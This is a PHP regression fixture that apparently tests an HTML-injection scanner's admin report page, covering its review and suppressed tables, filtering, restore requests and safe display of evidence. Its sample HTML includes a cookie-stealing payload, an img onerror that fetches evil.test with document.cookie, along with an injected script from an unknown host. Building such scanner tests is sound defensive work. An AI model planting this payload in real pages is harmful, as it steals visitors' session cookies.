<?php
if (PHP_SAPI !== 'cli') { exit; }
ob_start(); require __DIR__ . '/html-injection-scanner-regression.php'; ob_end_clean();
$state = array('report' => array('schema_version' => 2, 'status' => 'complete', 'phase' => 'done', 'counts' => array('posts' => 0, 'meta' => 0, 'options' => 0, 'urls' => 4), 'max_urls' => 4, 'findings' => array(), 'suppressed' => array(), 'issues' => array(), 'pages_scanned' => 4, 'files_analyzed' => 2), 'restored' => array());
$html = '<link rel=stylesheet href=/style.css media=print onload="this.media=\'all\'"><script>const s=document.createElement("script");s.src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXX";document.head.appendChild(s);</script><script>const s=document.createElement("script");s.src="https://unknown.test/widget.js";document.head.appendChild(s);</script><img onerror="fetch(\'https://evil.test/?x=\'+document.cookie)">';
$analysis = TK_HTML_Injection_Engine::scan($html, home_url('/'));
foreach (array('/', '/about/', '/works/', '/contact/') as $path) { foreach (array_merge($analysis['findings'], $analysis['suppressed']) as $finding) { tk_html_scan_record($state, $finding, 'Public HTML / ' . home_url($path), home_url($path)); } }
$state['report']['statistics'] = tk_html_scan_statistics($state['report']);
$options['tk_html_scan_report'] = $state['report']; unset($options['tk_html_scan_lock']);
echo '<!doctype html><html><head><meta charset="UTF-8"><style>body{font:13px -apple-system,sans-serif;background:#f0f0f1;color:#1d2327;margin:20px}.tk-wrap{max-width:1180px;margin:auto}.tk-card{background:white;padding:20px;border:1px solid #dcdcde;margin:20px 0}.tk-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px}input,select,textarea,button{font:inherit}input,select,textarea{padding:6px;max-width:100%;box-sizing:border-box}.large-text{width:100%}.widefat{width:100%;border-collapse:collapse}.widefat td,.widefat th{padding:10px;text-align:left;border-bottom:1px solid #ddd}.widefat tr:nth-child(even){background:#f6f7f7}.button{padding:6px 10px;border:1px solid #2271b1;background:white;color:#2271b1;cursor:pointer;border-radius:3px}.button-primary{background:#2271b1;color:white}.description{color:#646970}.tk-scan-table td{font-size:13px}';
echo file_get_contents(dirname(__DIR__) . '/assets/html-injection-scanner.css'); echo '</style></head><body>';
tk_html_scan_render_page();
echo '<script>window.fixtureReport=' . json_encode($state['report'], JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT) . ';window.fixtureCalls=0;window.fetch=async function(url,args){fixtureCalls++;if(args.body.get("action")!=="tk_html_scan_restore")throw Error("Unexpected automatic request");const fp=args.body.get("fingerprint");const f=fixtureReport.suppressed.find(x=>x.fingerprint===fp);fixtureReport.suppressed=fixtureReport.suppressed.filter(x=>x!==f);f.action="REVIEW";f.severity="low";f.classification="administrator_restored";fixtureReport.findings.push(f);return {ok:true,json:async()=>({success:true,data:{report:fixtureReport}})};};</script>';
echo '<script src="file://' . dirname(__DIR__) . '/assets/html-injection-scanner.js"></script>';
echo <<<'JS'
<script>
(async function(){try{
function verify(value,message){if(!value)throw Error(message);}
verify(window.fixtureCalls===0,'Opening page started a request');
verify(document.querySelectorAll('[data-scan-results] tr').length===1,'Security table mixed review/suppressed');
verify(document.querySelectorAll('[data-scan-review] tr').length===1,'Review table missing');
verify(document.querySelectorAll('[data-scan-suppressed] tr').length===2,'Suppressed audit missing');
const selector=document.querySelector('[data-scan-filter="action"]');selector.value='SKIP';selector.dispatchEvent(new Event('change'));
verify(Array.from(document.querySelectorAll('[data-scan-results] tr')).every(row=>row.hidden),'Filter did not hide report rows');
selector.value='';selector.dispatchEvent(new Event('change'));
document.querySelector('[data-scan-restore]').click();await new Promise(resolve=>setTimeout(resolve,30));
verify(window.fixtureCalls===1,'Restore did not make exactly one explicit request');
verify(document.querySelectorAll('[data-scan-review] tr').length===2,'Restore not placed in review');
verify(document.querySelectorAll('[data-scan-suppressed] tr').length===1,'Restored finding remains suppressed');
verify(!document.body.querySelector('img'),'Evidence executed as markup');
document.documentElement.dataset.fixtureResult='passed';
}catch(error){document.documentElement.dataset.fixtureResult=error.message;}}());
</script></body></html>
JS;
